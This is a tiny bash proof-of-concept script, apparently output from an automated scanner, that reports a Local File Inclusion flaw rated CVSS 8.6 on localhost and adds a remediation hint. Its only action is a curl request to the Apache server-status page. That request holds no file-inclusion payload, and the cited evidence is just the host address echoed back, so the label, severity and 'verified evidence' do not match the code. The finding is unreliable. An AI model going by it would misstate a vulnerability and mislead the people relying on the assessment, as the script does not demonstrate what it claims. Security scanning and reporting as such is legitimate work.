#!/bin/bash
# PoC: Local File Inclusion (INJ-LFI)  CVSS 8.6
# Target: 127.0.0.1
# Verified evidence: File content indicator '127.0.0.1' found in response
# Remediation: Resolve includes against an allowlist; never accept paths from input.
set -u
curl -s "http://127.0.0.1:80/server-status"
